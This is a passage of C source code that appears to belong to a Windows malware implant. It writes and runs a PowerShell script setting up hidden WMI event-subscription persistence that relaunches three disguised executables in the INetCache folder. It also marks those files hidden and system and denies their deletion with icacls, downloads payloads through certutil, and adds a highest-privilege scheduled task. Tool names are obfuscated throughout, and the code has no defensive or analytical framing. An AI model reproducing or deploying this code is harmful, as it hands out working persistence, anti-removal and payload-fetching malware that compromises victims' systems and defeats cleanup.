    fprintf(f, "$e='SysHealth'; $f=$e+'Filter'; $c=$e+'Consumer'; ");
    fprintf(f, "Remove-WmiObject -N 'root/subscription' -C _");
    fprintf(f, "_EventFilter -F \"Name='$f'\" -EA SilentlyContinue; ");
    fprintf(f, "$fl=Set-WmiObject -C _");
    fprintf(f, "_EventFilter -N 'root/subscription' -A @{Name=$f;EventNamespace='root/cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_Process\"'}; ");
    fprintf(f, "$co=Set-WmiObject -C CommandLineEvent");
    fprintf(f, "Consumer -N 'root/subscription' -A @{Name=$c;CommandLineTemplate='powershell.exe -NoP -W Hidden -C \"$p=\"$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache\\IE\"; @(\"ElevationService\",\"CrashHandler\",\"NotifyService\") | %% { if (-not (gps -Name $_ -EA SilentlyContinue)) { Start-Process \"$p\\$_.exe\" -ArgumentList \"--shadow\" -WindowStyle Hidden } }\"'}; ");
    fprintf(f, "Set-WmiObject -C _");
    fprintf(f, "_FilterToConsumerBinding -N 'root/subscription' -A @{Filter=$fl;Consumer=$co}\n");
    fclose(f);
    
    char cmd[512];
    char *ps = obf_ps();
    snprintf(cmd, sizeof(cmd), "%s -NoProfile -ExecutionPolicy Bypass -File \"%s\"", ps, psPath);
    sys_run_command(cmd);
    
    DeleteFileA(psPath);
}

/* === Obfuscated harden files ===
 * Prevents deletion by:
 * 1. Denying delete permissions via icacls
 * 2. Hiding files (hidden + system attributes)
 * 3. Removing inherited permissions
 */
void obf_sys_harden_files(void) {
    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    
    const char *files[] = {
        "ElevationService.exe",
        "CrashHandler.exe",
        "NotifyService.exe"
    };
    
    for (int i = 0; i < 3; i++) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
                 localAppData, files[i]);
        
        /* Set hidden + system attributes */
        SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        
        /* Remove all inherited permissions, deny delete for Everyone */
        char cmd[1024];
        char *icacls = obf_icacls();
        snprintf(cmd, sizeof(cmd),
            "%s \"%s\" /inheritance:r /deny Everyone:(DE,DC,WDAC,WO) /c /q",
            icacls, path);
        sys_run_command(cmd);
    }
}

/* === Obfuscated LOLBAS download === */
void obf_sys_lolbas_download(const char *url, const char *outPath) {
    char cmd[1024];
    char *certutil = obf_certutil();
    snprintf(cmd, sizeof(cmd), "%s -urlcache -split -f \"%s\" \"%s\"", certutil, url, outPath);
    sys_run_command(cmd);
}

/* === Obfuscated scheduled task === */
void obf_ensure_scheduled_task(const char *exePath, const char *taskName) {
    char cmd[1024];
    char *schtasks = obf_schtasks();
    snprintf(cmd, sizeof(cmd),
        "%s /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5 /f /rl highest",
        schtasks, taskName, exePath);
    sys_run_command(cmd);
}
